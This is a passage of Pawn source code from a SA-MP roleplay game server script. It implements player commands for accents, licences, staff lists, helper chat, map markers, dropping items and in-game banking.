			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Jamaican accent, use /accent to change it.");
		}
    	case 18:
		{
			format(Player[playerid][pAccent], 16, "Israeli");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Israeli accent, use /accent to change it.");
		}
     	case 19:
		{
			format(Player[playerid][pAccent], 16, "Indian");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Indian accent, use /accent to change it.");
		}
     	case 20:
		{
			format(Player[playerid][pAccent], 16, "Welsh");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Welsh accent, use /accent to change it.");
		}
     	case 21:
 		{
			format(Player[playerid][pAccent], 16, "French");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the French accent, use /accent to change it.");
		}
     	case 22:
		{
			format(Player[playerid][pAccent], 16, "German");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the German accent, use /accent to change it.");
		}
     	case 23:
		{
			format(Player[playerid][pAccent], 16, "Dutch");
			SendClientMessage(playerid, COLOR_WHITE, "You will now speak in the Dutch accent, use /accent to change it.");
		}
	}
	return 1;
}

IRP:licenses(playerid, var[])
{
	new string[256], carlicense[128], flylicense[128], weplicense[128], fishlicense[128];
    if(Player[playerid][pCarLic] == 1) format(carlicense, sizeof(carlicense), "Passed");
	else if(Player[playerid][pCarLic] == 0) format(carlicense, sizeof(carlicense), "Not Passed");
	if(Player[playerid][pFlyLic] == 1) format(flylicense, sizeof(flylicense), "Passed");
	else if(Player[playerid][pFlyLic] == 0) format(flylicense, sizeof(flylicense), "Not Passed");
	if(Player[playerid][pGunLic] == 1) format(weplicense, sizeof(weplicense), "Passed");
	else if(Player[playerid][pGunLic] == 0) format(weplicense, sizeof(weplicense), "Not Passed");
	if(Player[playerid][pFishLic] == 1) format(fishlicense, sizeof(fishlicense), "Passed");
	else if(Player[playerid][pFishLic] == 0) format(fishlicense, sizeof(fishlicense), "Not Passed");
   	if(!Logged(playerid)) return NoLogin(playerid);
	format(string, sizeof(string), "|____ Your Licenses & Registrations ____|");
	SendClientMessage(playerid, COLOR_INT, string);
	format(string, sizeof(string), "Name: {FFFFFF}%s", GetName(playerid));
	SendClientMessage(playerid, COLOR_INT, string);
	format(string, sizeof(string), "Driving License Status: {FFFFFF}%s", carlicense);
	SendClientMessage(playerid, COLOR_INT, string);
	format(string, sizeof(string), "Flying License Status: {FFFFFF}%s", flylicense);
	SendClientMessage(playerid, COLOR_INT, string);
	format(string, sizeof(string), "Weapon License Status: {FFFFFF}%s", weplicense);
	SendClientMessage(playerid, COLOR_INT, string);
	format(string, sizeof(string), "Fishing License Status: {FFFFFF}%s", fishlicense);
	SendClientMessage(playerid, COLOR_INT, string);
	return 1;
}

IRP:showlicenses(playerid, var[])
{
	new string[256], user, carlicense[128], flylicense[128], weplicense[128], fishlicense[128];
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /showlicenses [playerid]");
	if(!Logged(user)) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: You've entered an invalid player id.");
	if(Player[playerid][pCarLic] == 1) format(carlicense, sizeof(carlicense), "Passed");
	else if(Player[playerid][pCarLic] == 0) format(carlicense, sizeof(carlicense), "Not Passed");
	if(Player[playerid][pFlyLic] == 1) format(flylicense, sizeof(flylicense), "Passed");
	else if(Player[playerid][pFlyLic] == 0) format(flylicense, sizeof(flylicense), "Not Passed");
	if(Player[playerid][pGunLic] == 1) format(weplicense, sizeof(weplicense), "Passed");
	else if(Player[playerid][pGunLic] == 0) format(weplicense, sizeof(weplicense), "Not Passed");
	if(Player[playerid][pFishLic] == 1) format(fishlicense, sizeof(fishlicense), "Passed");
	else if(Player[playerid][pFishLic] == 0) format(fishlicense, sizeof(fishlicense), "Not Passed");
   	if(!Logged(playerid)) return NoLogin(playerid);
	format(string, sizeof(string), "|____ %s Licenses & Registrations ____|", GetName(playerid));
	SendClientMessage(user, COLOR_INT, string);
	format(string, sizeof(string), "Name: {FFFFFF}%s", GetName(playerid));
	SendClientMessage(user, COLOR_INT, string);
	format(string, sizeof(string), "Driving License Status: {FFFFFF}%s", carlicense);
	SendClientMessage(user, COLOR_INT, string);
	format(string, sizeof(string), "Flying License Status: {FFFFFF}%s", flylicense);
	SendClientMessage(user, COLOR_INT, string);
	format(string, sizeof(string), "Weapon License Status: {FFFFFF}%s", weplicense);
	SendClientMessage(user, COLOR_INT, string);
	format(string, sizeof(string), "Fishing License Status: {FFFFFF}%s", fishlicense);
	SendClientMessage(user, COLOR_INT, string);
	return 1;
}




IRP:helpers(playerid, var[])
{
	new online, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	foreach(Player, i)
	{
	    if(Player[i][pHelper])
	    {
	        online ++;
	    }
	}
	format(string, sizeof(string), "|________ Online Community Helpers Team  ________|");
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	foreach(Player, i)
	{
	    if(Player[i][pHelper])
	    {
	        format(string, sizeof(string), "%s %s", RPHLN(i), GetName(i));
	        SendClientMessage(playerid, COLOR_LIME, string);
	    }
	}
	return 1;
}
IRP:famed(playerid, var[])
{
	new online, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	foreach(Player, i)
	{
	    if(Player[i][pFamed])
	    {
	        online ++;
	    }
	}
	format(string, sizeof(string), "|________ Online Famous People  ________|");
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	foreach(Player, i)
	{
	    if(Player[i][pFamed])
	    {
	        format(string, sizeof(string), "%s %s", RPOSLN(i), GetName(i));
	        SendClientMessage(playerid, COLOR_ORANGE, string);
	    }
	}
	return 1;
}
IRP:testers(playerid, var[])
{
	new online, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	foreach(Player, i)
	{
	    if(Player[i][pTester])
	    {
	        online ++;
	    }
	}
	format(string, sizeof(string), "|________ Online Beta Testers  ________|");
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	foreach(Player, i)
	{
	    if(Player[i][pTester])
	    {
	        format(string, sizeof(string), "%s %s", RPBTLN(i), GetName(i));
	        SendClientMessage(playerid, COLOR_LIME, string);
	    }
	}
	return 1;
}
IRP:sadmins(playerid, var[])
{
	new online, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] < 100000 || !Player[playerid][pStaffObserver]) return NoAuth(playerid);
	foreach(Player, i)
	{
	    if(Player[i][pStaffObserver])
	    {
	        online ++;
	    }
	}
	format(string, sizeof(string), "|________ Online Staff Observers  ________|");
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	foreach(Player, i)
	{
	    if(Player[i][pStaffObserver])
	    {
	        format(string, sizeof(string), "Staff Observer %s", GetName(i));
	        SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	}
	return 1;
}
IRP:mappers(playerid, var[])
{
	new online, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	foreach(Player, i)
	{
	    if(Player[i][pMapper])
	    {
	        online ++;
	    }
	}
	format(string, sizeof(string), "|________ Online Mappers  ________|");
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	foreach(Player, i)
	{
	    if(Player[i][pMapper])
	    {
	        format(string, sizeof(string), "%s %s", RPMLN(i), GetName(i));
	        SendClientMessage(playerid, COLOR_LIME, string);
	    }
	}
	return 1;
}
IRP:helperhelp(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pHelper] >= 1)
	{
    	SendClientMessage(playerid, COLOR_INT, "_____________________________________________________");
    	SendClientMessage(playerid, COLOR_LIME, "* Junior Helper: {FFFFFF}/hc /newbie /pm /fix");
    	SendClientMessage(playerid, COLOR_LIME, "* General Helper: {FFFFFF}/nwarn /runmute /nunmute");
    	SendClientMessage(playerid, COLOR_LIME, "* Senior Helper: {FFFFFF}/goto /goback");
    	SendClientMessage(playerid, COLOR_LIME, "* Asst. Head Helper: {FFFFFF}/firehelper");
    	SendClientMessage(playerid, COLOR_LIME, "* Head Helper: {FFFFFF}/makehelper /oremovehelper");
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:firehelper(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pHelper] < 4) return NoAuth(playerid);
	{
	    new user, string[128], string2[128], log[256];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /firehelper [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(!Player[playerid][pHelper]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not a helper.");
		format(string, sizeof(string), "AdminWarning: %s has fired %s from the Community Helpers team.", GetName(playerid), GetName(user));
    	format(string2, sizeof(string2), "HelperWarning: %s has fired %s from the Community Helpers team.", GetName(playerid), GetName(user));
        format(log, sizeof(log), "AdminWarning: %s (%s) has fired %s (%s) from the Community Helpers team.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/firehelper.log", log);
		Player[user][pHelper] = 0;
		SendAdminMessage(COLOR_ADMWARN, string);
		SendHelperMessage(COLOR_ADMWARN, string2);
		if(!Player[user][pHelper])
		{
		    SendClientMessage(user, COLOR_ADMWARN, string2);
		}
	}
	return 1;
}
IRP:fam(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamed] || Player[playerid][pAdmin] >= 1338)
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fam [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	if(Player[playerid][pFamed]) format(string, sizeof(string), "* Famed %s: %s", GetName(playerid), var);
    	foreach(Player, i)
    	{
	    	if(Logged(i))
	    	{
    			if(Player[i][pFamed])
	    		{
	    	    	SendClientMessage(i, COLOR_ORANGE, string);
	    		}
	    	}
    	}
    	// Logs
    	if(Player[playerid][pFamed]) format(string, sizeof(string), "* Famed %s: %s", GetName(playerid), var);
    	Log("Log/Admins/fam.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:hc(playerid, var[])
{
    new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pHelper])
	{
    	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hc [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	if(Player[playerid][pHelper]) format(string, sizeof(string), "* %s %s: %s", RPHLN(playerid), GetName(playerid), var);
    	foreach(Player, i)
    	{
	    	if(Logged(i))
	    	{
    			if(Player[i][pHelper])
	    		{
	    	    	SendClientMessage(i, COLOR_LIME, string);
	    		}
	    	}
    	}
    	// Logs
    	if(Player[playerid][pHelper]) format(string, sizeof(string), "* %s %s: %s", RPHLN(playerid), GetName(playerid), var);
    	Log("Log/Admins/hc.log", string);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:pm(playerid, var[])
{
	new user, string[128], text[128];
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pHelper] >= 1)
   	{
    	if(sscanf(var, "us[128]", user, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /pm [playerid] [text]");
    	if(AntiAdv(playerid, var)) return 1;
    	if(!HelpTime[user]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to PM player that doesn't request help.");
    	if(!strlen(text)) return 0;
    	if(!Logged(user)) return NoLoginB(playerid);
    	format(string, sizeof(string), "PM to %s: %s", GetName(user), text);
    	SendClientMessage(playerid, COLOR_YELLOW, string);
    	format(string, sizeof(string), "PM from %s: %s", GetName(playerid), text);
    	SendClientMessage(user, COLOR_YELLOW, string);
     	format(string, sizeof(string), "PM from %s to %s: %s", GetName(playerid), GetName(user), text);
    	Log("Log/Admins/pm.log", string);
    	foreach(Player, i)
    	{
    	    if(Player[i][pAdmin] >= 1 && PMs[i] && i != playerid && i != user)
	        {
    	        format(string, sizeof(string), "[BigEar] PM: %s to %s: %s", GetName(playerid), GetName(user), text);
     	        SendClientMessage(i, COLOR_LIGHTSALMON, string);
	        }
    	}
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:id(playerid, var[])
{
	new string[128], user;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /id [playerid]");
	if(!Logged(user) && !IsPlayerNPC(user)) return NoLoginB(playerid);
	format(string, sizeof(string), " %s - ID: %d", GetName(user), user);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	return 1;
}

IRP:changepass(playerid, var[])
{
	new file[32], string[128], password[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[64]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /changepass [password]");
	if(strlen(var) < 4) return SendClientMessage(playerid, COLOR_GRAD2, "Password can't be less than 4 characters.");
	if(strlen(var) > 256) return SendClientMessage(playerid, COLOR_GRAD2, "Password can't be longer than 256 characters.");
	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	WP_Hash(password, sizeof(password), var);
	dini_Set(file, "Password", password);
	format(string, sizeof(string), " You have changed your password to: {FFFFFF}%s{00C0FF}.", var);
	SendClientMessage(playerid, COLOR_INT, string);
	return 1;
}
IRP:changpasswordmofos(playerid, var[])
{
	new file[32], password[256];
	//format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
	WP_Hash(password, sizeof(password), var);
	dini_Set(file, "Password", password);
	return 1;
}
IRP:search(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[32]", var))
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /search  [location]");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [LOCATIONS]: Off | Bank | Mechanic | Lawyer | Trucker | WeaponSmuggler | WeaponDealer | DrugFactory");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [LOCATIONS]: DrugDealer | DrugSmuggler | Bodyguard | Dealership | CocaineLab | SeedHouse");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [LOCATIONS]: LowMats | MedMats | HighMats | ProdCompany | MyHouse | MyBiz | MyGarage");

	    return 1;
	}
	if(!strcmp(var, "off", true))
	{
	     DisablePlayerCheckpoint(playerid);
	     SendClientMessage(playerid, COLOR_WHITE, "** You have cleared the marker on your map.");
	}
	else if(!strcmp(var, "bank", true))
	{
	     SetPlayerCheckpoint(playerid, 1462.4095,-1011.1602,26.8438, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Bank is now marked on your map.");
	}
	else if(!strcmp(var, "mechanic", true))
	{
	     SetPlayerCheckpoint(playerid, 2330.0693,-2315.4709,13.5469, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Mechanic is now marked on your map.");
	}
	else if(!strcmp(var, "lawyer", true))
	{
	     SetPlayerCheckpoint(playerid, 1380.8300,-1088.7698,27.3844, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Lawyer is now marked on your map.");
	}
	else if(!strcmp(var, "trucker", true))
	{
	     SetPlayerCheckpoint(playerid, -76.8260,-1136.7341,1.0781, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Trucker is now marked on your map.");
	}
	else if(!strcmp(var, "weaponsmuggler", true))
	{
	     SetPlayerCheckpoint(playerid, 2112.5371,-121.4570,2.1263, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Weapon Smuggler is now marked on your map.");
	}
	else if(!strcmp(var, "weapondealer", true))
	{
	     SetPlayerCheckpoint(playerid, 2097.8765,-111.1796,8.1172, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Weapon Dealer is now marked on your map.");
	}
	else if(!strcmp(var, "drugdealer", true))
	{
	     SetPlayerCheckpoint(playerid, 2178.5518,-1660.4418,14.9644, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Drug Dealer is now marked on your map.");
	}
	else if(!strcmp(var, "drugsmuggler", true))
	{
	     SetPlayerCheckpoint(playerid, 2354.7354,-1170.1056,28.0475, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Drug Smuggler is now marked on your map.");
	}
	else if(!strcmp(var, "bodyguard", true))
	{
	     SetPlayerCheckpoint(playerid, 2227.9976,-1718.2604,13.5321, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The BodyGuard is now marked on your map.");
	}
	else if(!strcmp(var, "dealership", true))
	{
	     SetPlayerCheckpoint(playerid, 545.6661,-1292.2437,17.2422, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Vehicle Dealership is now marked on your map.");
	}
	else if(!strcmp(var, "cocainelab", true))
	{
	     SetPlayerCheckpoint(playerid, 2351.8662,-1170.1896,28.0515, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Cocaine Lab is now marked on your map.");
	}
	else if(!strcmp(var, "seedhouse", true))
	{
	     SetPlayerCheckpoint(playerid, 2165.9514,-1671.1809,15.0732, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Seeds House is now marked on your map.");
	}
	else if(!strcmp(var, "drugfactory", true))
	{
	     SetPlayerCheckpoint(playerid, 65.4823,-292.5736,1.5781, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Drug Factory is now marked on your map.");
	}
	else if(!strcmp(var, "lowmats", true))
	{
	     SetPlayerCheckpoint(playerid, 2128.8381,-102.9780,2.1263, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Low Material Pickup is now marked on your map.");
	}
	else if(!strcmp(var, "medmats", true))
	{
	     SetPlayerCheckpoint(playerid, 2118.5664,-103.2024,2.1263, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Medium Material Pickup is now marked on your map.");
	}
	else if(!strcmp(var, "highmats", true))
	{
	     SetPlayerCheckpoint(playerid, 2120.7715,-114.0335,2.1263, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The High Material Pickup is now marked on your map.");
	}
	else if(!strcmp(var, "prodcompany", true))
	{
	     SetPlayerCheckpoint(playerid, -1557.5293,-2723.8181,48.7435, 3);
	     SendClientMessage(playerid, COLOR_WHITE, "** The Products Company Pickup is now marked on your map.");
	}
	else if(!strcmp(var, "myhouse", true))
	{
		new idx;
	    if(Player[playerid][pHouse])
    	{
	         idx = Player[playerid][pHouse];
	         SetPlayerCheckpoint(playerid, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ], 3);
	    }
	    SendClientMessage(playerid, COLOR_WHITE, "* Your House is now marked on your map.");
	}
	else if(!strcmp(var, "mybiz", true))
	{
		new idxx;
	    if(Player[playerid][pBiz])
    	{
	         idxx = Player[playerid][pBiz];
	         SetPlayerCheckpoint(playerid, BizInfo[idxx][bX], BizInfo[idxx][bY], BizInfo[idxx][bZ], 3);
	    }
	    SendClientMessage(playerid, COLOR_WHITE, "* Your Biz is now marked on your map.");
	}
	else if(!strcmp(var, "mygarage", true))
	{
		new idxxx;
	    if(Player[playerid][pGarage])
    	{
	         idxxx = Player[playerid][pGarage];
	         SetPlayerCheckpoint(playerid, GarageInfo[idxxx][gX], GarageInfo[idxxx][gY], GarageInfo[idxxx][gZ], 3);
	    }
	    SendClientMessage(playerid, COLOR_WHITE, "* Your Garage is now marked on your map.");
	}
	return 1;
}

IRP:drop(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[32]", var))
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /drop [item]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [ITEMS]: weapon | weapons | materials | weed | cocaine | fishes | seed ");
	    return 1;
	}
	if(!strcmp(var, "weapons", true, 7))
	{
	    new confirm[8];
	    if(Event[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command in event.");
	    if(Paintball[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command in paintball.");
		if(sscanf(var, "s[32]s[8]", var, confirm)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /drop weapons [confirm]");
		if(!strcmp(confirm, "confirm", true))
		{
		    format(string, sizeof(string), "* %s throws away all their weapons.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			ResetZamoraWeapons(playerid);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		}
	}
	else if(!strcmp(var, "weapon", true, 6))
	{
	    if(Event[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command in event.");
	    if(Paintball[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to use this command in paintball.");
    	if(GetPlayerWeapon(playerid) == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding a weapon in your hand.");
	    format(string, sizeof(string), "* %s throws away their %s.", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		RemoveZamoraWeapon(playerid, GetPlayerWeapon(playerid));
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	}
	else if(!strcmp(var, "materials", true, 9))
	{
	    new confirm[8];
		if(sscanf(var, "s[32]s[8]", var, confirm)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /drop materials [confirm]");
		if(!strcmp(confirm, "confirm", true))
		{
		    Player[playerid][pLMaterials] = 0;
		    Player[playerid][pMMaterials] = 0;
		    Player[playerid][pHMaterials] = 0;
		    format(string, sizeof(string), "* %s has thrown away all their materials.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		}
	}
	else if(!strcmp(var, "weed", true, 4))
	{
	    new confirm[8];
		if(sscanf(var, "s[32]s[8]", var, confirm)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /drop weed [confirm]");
		if(!strcmp(confirm, "confirm", true))
		{
		    Player[playerid][pWeed] = 0;
		    format(string, sizeof(string), "* %s has thrown away all their weed.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		}
	}
	else if(!strcmp(var, "seed", true, 5))
	{
	    new confirm[8];
		if(sscanf(var, "s[32]s[8]", var, confirm)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /drop seed [confirm]");
		if(!strcmp(confirm, "confirm", true))
		{
		    Player[playerid][pSeeds] = 0;
		    format(string, sizeof(string), "* %s has thrown away all their seeds.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		}
	}
	else if(!strcmp(var, "cocaine", true, 5))
	{
	    new confirm[8];
		if(sscanf(var, "s[32]s[8]", var, confirm)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /drop cocaine [confirm]");
		if(!strcmp(confirm, "confirm", true))
		{
		    Player[playerid][pCocaine] = 0;
		    format(string, sizeof(string), "* %s has thrown away all their cocaine.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		}
	}
	else if(!strcmp(var, "fishes", true, 6))
	{
	    new confirm[8];
		if(sscanf(var, "s[32]s[8]", var, confirm)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /drop fishes [confirm]");
		if(!strcmp(confirm, "confirm", true))
		{
		    for(new i=0; i<5; i++)
		    {
		    	Player[playerid][pFish][i] = 0;
			}
		    format(string, sizeof(string), "* %s has thrown away all their fishes.", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		}
	}
	return 1;
}

IRP:pay(playerid, var[])
{
	new string[128], user, amount;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "ui", user, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /pay [playerid] [amount]");
	if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "[ERROR]: You're entering an invalid money amount.");
	if(amount > 5000 && Player[playerid][pLevel] < 2 || amount > 10000 && Player[playerid][pLevel] < 7 || amount > 15000 && Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your level is too low to pay that amount of money.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to complete this action.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[playerid][pLevel] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You must be level 2 to pay someone money.");
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(Player[playerid][pMoney] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you right now.");
	GiveZamoraMoney(playerid, -amount);
	GiveZamoraMoney(user, amount);
	format(string, sizeof(string), "* %s takes out their wallet and gives %s some money.", GetName(playerid), GetName(user), amount);
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	format(string, sizeof(string), " You have given %s $%d.", GetName(user), amount);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has given you $%d.", GetName(playerid), amount);
	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), "%s has given %s $%d.",GetName(playerid), GetName(user), amount);
	new ip[32], ipex[32];
	GetPlayerIp(playerid, ip, sizeof(ip));
	GetPlayerIp(user, ipex, sizeof(ipex));
	format(string, sizeof(string), "AdminWarning: %s (IP:%s) has transferred $%d to %s (IP:%s).", GetName(playerid), ip, amount, GetName(user), ipex);
	SendAdminMessage(COLOR_ADMWARN, string);
	Log("Log/Players/pay.log", string);
	return 1;
}

IRP:paycheck(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	format(string, sizeof(string), "* You have played for %d minutes.", Player[playerid][pMinutes]);
	if(Player[playerid][pMinutes] < 40) SendClientMessage(playerid, COLOR_RED, string);
	else SendClientMessage(playerid, COLOR_GREEN, string);
	format(string, sizeof(string), "* You need to play for at least 40 minutes every hour to recieve a paycheck.");
	SendClientMessage(playerid, COLOR_INT, string);
	return 1;
}

IRP:withdraw(playerid, var[])
{
	new amount, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsPlayerNearBankBooth(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in the bank.");
	if(sscanf(var, "i", amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /withdraw [amount]");
	if(amount > Player[playerid][pBank]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money in your bank account.");
	if(amount <= 0)  return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid amount of money.");
	Player[playerid][pBank] -= amount;
	GiveZamoraMoney(playerid, amount);
	format(string, sizeof(string), " You have withdrawn $%d from your bank account, your bank balance is now: $%d.", amount, Player[playerid][pBank]);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}
IRP:balance(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsPlayerNearBankBooth(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in the bank.");
	format(string, sizeof(string), "You have $%d in your account.",Player[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}
IRP:transfer(playerid, var[])
{
    new string[128], user, amount;
	if(Player[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't transfer money while you are level 1.");
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsPlayerNearBankBooth(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in the bank.");
	if(sscanf(var, "ud", user, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /transfer [playerid] [amount]");
	if(Logged(user))
	{
		new playermoney = Player[playerid][pBank] ;
		if(user == playerid) return SendClientMessage(playerid, COLOR_GRAD2, "* Invalid transaction amount.");
        if(amount < 0) return SendClientMessage(playerid, COLOR_GRAD2, "* Invalid transaction amount.");
		if(playermoney < amount) SendClientMessage(playerid, COLOR_GRAD2, "* Invalid transaction amount.");
		Player[playerid][pBank] -= amount;
		Player[user][pBank] += amount;
		format(string, sizeof(string), "* You have transferred $%d to %s's account.", amount, GetName(user));
	   	SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "* You have recieved $%d to into your account from %s.", amount, GetName(playerid));
		SendClientMessage(user, COLOR_WHITE, string);
		new ip[32], ipex[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		GetPlayerIp(user, ipex, sizeof(ipex));
		format(string, sizeof(string), "AdminWarning: %s (IP:%s) has transferred $%d to %s (IP:%s).", GetName(playerid), ip, amount, GetName(user), ipex);
